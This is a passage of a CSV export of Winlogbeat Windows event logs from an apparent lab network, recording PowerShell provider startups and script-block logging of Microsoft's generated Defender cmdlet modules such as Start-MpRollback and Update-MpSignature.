	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6178,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.106",c3kXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6179,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:55.106",dHkXBIQByII7dpeEbSzc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:05:55.467","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6180,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:05:52.844",cHkXBIQByII7dpeEZSz1,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 17:05:53.441","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4779,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:34.579",gHkSBIQByII7dpeEjBwK,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:35.659","Oct 23, 2022 @ 17:00:35.208",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpRollback'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpRollback
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${Engine},

    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${Platform},

    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Engine')) {
          [object]$__cmdletization_value = ${Engine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Platform')) {
          [object]$__cmdletization_value = ${Platform}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpRollback.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpRollback' -Alias '*'
        


ScriptBlock ID: 65c16a5e-b234-4d9f-b17d-83caaeb897f5
Path: ","65c16a5e-b234-4d9f-b17d-83caaeb897f5","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpRollback'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpRollback
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${Engine},

    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [switch]
    ${Platform},

    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Engine')) {
          [object]$__cmdletization_value = ${Engine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Platform')) {
          [object]$__cmdletization_value = ${Platform}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpRollback.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpRollback' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-09d3-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3356,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.453",f3kSBIQByII7dpeEjBwK,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:35.659","Oct 23, 2022 @ 17:00:35.207",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpWDOScan'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpWDOScan
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*'
        


ScriptBlock ID: c96caed2-5860-4c4d-872a-b6ebd36075ba
Path: ","c96caed2-5860-4c4d-872a-b6ebd36075ba","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpWDOScan'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpWDOScan
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0000-00cd-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3355,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.446",fnkSBIQByII7dpeEjBwK,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:35.659","Oct 23, 2022 @ 17:00:35.205",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpSignature'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Update-MpSignature
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Update0')]
    [AllowEmptyString()]
    [AllowNull()]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]
    ${UpdateSource},

    [Parameter(ParameterSetName='Update0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Update0')]
    [int]
    ${ThrottleLimit},

